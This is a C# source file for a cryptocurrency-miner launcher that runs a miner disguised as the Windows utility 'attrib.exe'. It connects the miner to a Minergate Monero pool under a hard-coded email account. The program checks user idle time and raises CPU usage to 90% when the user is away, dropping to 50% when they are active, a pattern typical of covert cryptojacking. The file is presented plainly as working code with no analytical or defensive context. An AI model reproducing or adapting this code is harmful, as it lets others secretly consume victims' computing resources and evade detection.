﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace gpulmnr
{
    class Program
    {
        public static String miner_exe = "attrib.exe";

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        /// <summary>
        /// Helps to find the idle time, (in milliseconds) spent since the last user input
        /// </summary>

            [DllImport("User32.dll")]
            private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

            [DllImport("Kernel32.dll")]
            private static extern uint GetLastError();


  

        static void Main(string[] args)
        {

            mainThread();
        }


        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }
        /// <summary>
        /// Get the Last input time in milliseconds
        /// </summary>
        /// <returns></returns>
        public static long GetLastInputTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            if (!GetLastInputInfo(ref lastInPut))
            {
                throw new Exception(GetLastError().ToString());
            }
            return lastInPut.dwTime;
        }


        public static void mainThread()
        {
            string idlearg = "-o stratum+tcp://xdn-xmr.pool.minergate.com:45790 -u avtoritet1337@gmail.com -p x -k --max-cpu-usage=90 --donate-level=1";
            string noidlearg = "-o stratum+tcp://xdn-xmr.pool.minergate.com:45790 -u avtoritet1337@gmail.com -p x -k --max-cpu-usage=50 --donate-level=1";

            int i = 0;

            while (true)
            {


                

                if (GetIdleTime() > 6000)
                {


                    if (i == 1)
                    {
                        foreach (Process proc in Process.GetProcessesByName("attrib"))
                        {
                            proc.Kill();
                        }

                        ProcessStartInfo mnrexe = new ProcessStartInfo(miner_exe);
                        mnrexe.UseShellExecute = false;
                        mnrexe.CreateNoWindow = false;
                        mnrexe.Arguments = (idlearg);
                        Process.Start(mnrexe);
                        Console.WriteLine("90%");


                        i = 0;


                    }



                }
                else
                {




                    if (i == 0)
                    {
                        foreach (Process proc in Process.GetProcessesByName("attrib"))
                        {
                            proc.Kill();
                        }

                        ProcessStartInfo mnrexe = new ProcessStartInfo(miner_exe);
                        mnrexe.UseShellExecute = false;
                        mnrexe.CreateNoWindow = false;
                        mnrexe.Arguments = (noidlearg);
                        Process.Start(mnrexe);
                        Console.WriteLine("50%");

                        i = 1;


                    }


                }




                Thread.Sleep(666);
            }
        }

    }

}
